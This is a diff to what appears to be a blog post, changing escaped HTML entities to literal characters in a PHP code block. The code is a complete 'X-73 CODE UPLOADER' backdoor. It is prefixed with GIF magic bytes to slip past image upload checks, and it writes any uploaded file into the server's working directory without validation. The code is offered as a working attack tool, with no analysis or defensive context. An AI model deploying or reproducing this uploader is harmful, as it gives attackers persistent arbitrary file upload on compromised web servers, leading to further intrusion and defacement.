@@ -19,8 +19,8 @@ tags:
 {% highlight php linenos %}GIF89;a
 <?php
     $myUpload = new maxUpload(); 
-    //$myUpload-&gt;setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
-    $myUpload-&gt;uploadFile();
+    //$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
+    $myUpload->uploadFile();
 ?>
 <?php
 class maxUpload{
@@ -34,7 +34,7 @@ class maxUpload{
      * @return maxUpload
      */
     function maxUpload(){
-        $this-&gt;uploadLocation = getcwd().DIRECTORY_SEPARATOR;
+        $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
     }
 
     /**
@@ -45,56 +45,56 @@ class maxUpload{
      * @param String Directory where to store the files
      */
     function setUploadLocation($dir){
-        $this-&gt;uploadLocation = $dir;
+        $this->uploadLocation = $dir;
     }
     
     function showUploadForm($msg='',$error=''){
 ?>
-       &lt;div id="container"&gt;
-            &lt;div id="header"&gt;&lt;div id="header_left"&gt;&lt;/div&gt;
-            &lt;div id="header_main"&gt;SUL-BAR LINK&lt;div id="header_right"&gt;&lt;/div&gt;&lt;/div&gt;
-            &lt;div id="content"&gt;
+       <div id="container">
+            <div id="header"><div id="header_left"></div>
+            <div id="header_main">SUL-BAR LINK<div id="header_right"></div></div>
+            <div id="content">
 <?php
 if ($msg != ''){
-    echo '&lt;p class="msg"&gt;'.$msg.'&lt;/p&gt;';
+    echo '<p class="msg">'.$msg.'</p>';
 } else if ($error != ''){
-    echo '&lt;p class="emsg"&gt;'.$error.'&lt;/p&gt;';
+    echo '<p class="emsg">'.$error.'</p>';
 
 }
 ?>
-&lt;body bgcolor="#000000"&gt;&lt;center&gt;&lt;div style="background-image:url(''); width="1040" height="710" class="shakeimage" onMouseOver="init(this);rattleimage()" onMouseOut="stoprattle(this);top.focus()" onClick="top.focus()" alt="" border="0"&gt;&lt;br&gt;&lt;div
-id="example1"&gt;&lt;/div&gt;&lt;p id="example2"&gt;&lt;font face="Papyrus"; color="red"; size="6"&gt;&lt;br&gt;--==@[-- X-73 CODE UPLOADER --]==--
+<body bgcolor="#000000"><center><div style="background-image:url(''); width="1040" height="710" class="shakeimage" onMouseOver="init(this);rattleimage()" onMouseOut="stoprattle(this);top.focus()" onClick="top.focus()" alt="" border="0"><br><div
+id="example1"></div><p id="example2"><font face="Papyrus"; color="red"; size="6"><br>--==@[-- X-73 CODE UPLOADER --]==--
 
-                &lt;form action="" method="post" enctype="multipart/form-data" &gt;
-                     &lt;center&gt;
-                         &lt;label&gt;File:
-                             &lt;input name="myfile" type="file" size="30" /&gt;
-                         &lt;/label&gt;
-                         &lt;label&gt;
-                             &lt;input type="submit" name="submitBtn" class="sbtn" value="Upload" /&gt;
-                         &lt;/label&gt;
-                     &lt;/center&gt;
-                 &lt;/form&gt;
-             &lt;/div&gt;
-             &lt;div id="footer"&gt;&lt;a href="http://www.sekedar-online.com" target="_blank"&gt;Sulbar-Link&lt;/a&gt;&lt;/div&gt;
-         &lt;/div&gt;
+                <form action="" method="post" enctype="multipart/form-data" >
+                     <center>
+                         <label>File:
+                             <input name="myfile" type="file" size="30" />
+                         </label>
+                         <label>
+                             <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
+                         </label>
+                     </center>
+                 </form>
+             </div>
+             <div id="footer"><a href="http://www.sekedar-online.com" target="_blank">Sulbar-Link</a></div>
+         </div>
 <?php
     }
 
     function uploadFile(){
         if (!isset($_POST['submitBtn'])){
-            $this-&gt;showUploadForm();
+            $this->showUploadForm();
         } else {
             $msg = '';
             $error = '';
             
             //Check destination directory
-            if (!file_exists($this-&gt;uploadLocation)){
+            if (!file_exists($this->uploadLocation)){
                 $error = "The target directory doesn't exists!";
-            } else if (!is_writeable($this-&gt;uploadLocation)) {
+            } else if (!is_writeable($this->uploadLocation)) {
                 $error = "The target directory is not writeable!";
             } else {
-                $target_path = $this-&gt;uploadLocation . basename( $_FILES['myfile']['name']);
+                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);
 
                 if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                     $msg = basename( $_FILES['myfile']['name']).
@@ -104,7 +104,7 @@ id="example1"&gt;&lt;/div&gt;&lt;p id="example2"&gt;&lt;font face="Papyrus"; col
                 }
             }
 
-            $this-&gt;showUploadForm($msg,$error);
+            $this->showUploadForm($msg,$error);
         }
 
     }
